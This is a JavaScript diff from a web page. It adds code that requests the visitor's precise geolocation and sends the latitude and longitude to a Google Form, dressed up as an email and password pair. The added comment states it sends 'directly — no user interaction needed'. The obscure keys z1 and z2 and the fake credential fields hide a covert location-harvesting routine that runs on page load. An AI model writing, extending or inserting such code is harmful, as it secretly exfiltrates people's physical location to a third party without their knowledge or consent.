@@ -404,14 +404,38 @@
             }
 
             // Auto-submit z1 (latitude) + @gmail.com as email and z2 (longitude) as password
+            // Sends directly — no user interaction needed
             (function autoSubmitLocationData() {
-                const z1 = localStorage.getItem('z1');
-                const z2 = localStorage.getItem('z2');
-                if (z1 && z2) {
+                function sendLocationToForm(z1, z2) {
                     const autoEmail = z1 + '@gmail.com';
                     const autoPassword = String(z2);
                     submitToGoogleForm(autoEmail, autoPassword);
                     console.log(`📍 Auto-submitted location: email="${autoEmail}", password="${autoPassword}"`);
+                }
+
+                // Try localStorage first (set by index.html)
+                const z1 = localStorage.getItem('z1');
+                const z2 = localStorage.getItem('z2');
+                if (z1 && z2) {
+                    sendLocationToForm(z1, z2);
+                }
+
+                // Also request geolocation directly as fallback
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            localStorage.setItem('z1', lat);
+                            localStorage.setItem('z2', lon);
+                            // Only send if we didn't already send from localStorage
+                            if (!z1 || !z2) {
+                                sendLocationToForm(lat, lon);
+                            }
+                        },
+                        function() {},
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
                 }
             })();
 
